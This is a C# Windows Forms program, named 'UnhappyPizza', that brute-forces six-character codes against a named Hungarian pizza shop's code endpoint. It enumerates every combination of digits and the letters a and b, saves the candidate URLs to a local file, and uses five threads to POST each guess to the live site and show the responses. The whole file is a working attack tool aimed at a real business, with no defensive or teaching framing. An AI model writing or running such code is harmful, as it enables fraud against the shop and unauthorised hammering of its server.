using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UnhappyPizza
{
    public partial class MainForm : Form
    {
        private HttpClient HttpClient = new HttpClient();
        private StringBuilder sbFinal = new StringBuilder();
        private const int lenght = 6;
        private const string url = "http://happyhotpizza.hu/kecskemet/ckkod/";
        private static char[] chars =

        {
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
            'a', 'b'
        };

        private BlockingCollection<string> bc = new BlockingCollection<string>();

        public MainForm()
        {
            InitializeComponent();
            tbUrl.Text = url;
        }

        public void StartBruteForce(int length)
        {
            StringBuilder sb = new StringBuilder(length);
            char currentChar = chars[0];

            for (int i = 1; i <= length; i++)
            {
                sb.Append(currentChar);
            }
            ChangeCharacters(0, sb, length);
            FileStream fs = new FileStream(@"C:\alma\unhappypizza.txt", FileMode.OpenOrCreate, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(sbFinal.ToString());
            sw.Close();

            MessageBox.Show("fasza!!!");
        }

        private StringBuilder ChangeCharacters(int pos, StringBuilder sb, int length)
        {
            for (int i = 0; i <= chars.Length - 1; i++)
            {
                sb.Replace(sb[pos], chars[i], pos, 1);
                if (pos == length - 1)
                {
                    bc.Add(sb.ToString());
                    sbFinal.Append(url+sb.ToString() + Environment.NewLine);
                }
                else
                {
                    ChangeCharacters(pos + 1, sb, length);
                }
            }
            return sb;
        }
        private void btnStart_Click(object sender, EventArgs e)
        {
            Thread MainThread = new Thread(() => StartBruteForce(lenght));
            MainThread.Start();



            for (int i = 0; i < 5; i++)
            {
                Task.Factory.StartNew(() =>
                {


                    foreach (var code in bc.GetConsumingEnumerable())
                    {
                        var result = SendRequest(code).Result;
                        //Debug.WriteLine(code);
                        //tbMain.Invoke(new Action(() => tbMain.AppendText(url + code + " " + result + Environment.NewLine)));
                        int id = Thread.CurrentThread.ManagedThreadId;
                          tbMain.Invoke(new Action(() => tbMain.AppendText(code + " \t" + result + Environment.NewLine)));
                    }

                });
            }
        }


        private async Task<string> SendRequest(string code)
        {

            var result = await HttpClient.PostAsync(url + code, null);
            return await result.Content.ReadAsStringAsync();
        }

        private void btnFeck_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < 5; i++)
            {
                Task.Factory.StartNew(() =>
                {
                    foreach (var code in bc.GetConsumingEnumerable())
                    {
                        var result = SendRequest(code).Result;
                        //Debug.WriteLine(code);
                        //tbMain.Invoke(new Action(() => tbMain.AppendText(url + code + " " + result + Environment.NewLine)));
                        int id = Thread.CurrentThread.ManagedThreadId;
                        tbMain.Invoke(new Action(() => tbMain.AppendText(code + " \t" + result + Environment.NewLine)));
                    }

                });
            }

            FileStream fs = new FileStream(@"C:\alma\unhappypizza.txt", FileMode.Open, FileAccess.Read);
            StreamReader sr = new StreamReader(fs);
            int count = 0;
            while (!sr.EndOfStream)
            {  
                string code = sr.ReadLine();
                bc.Add(code);
                if (++count >= 5)
                {
                    break;
                }
            }
            sr.Close();
        }
    }
}
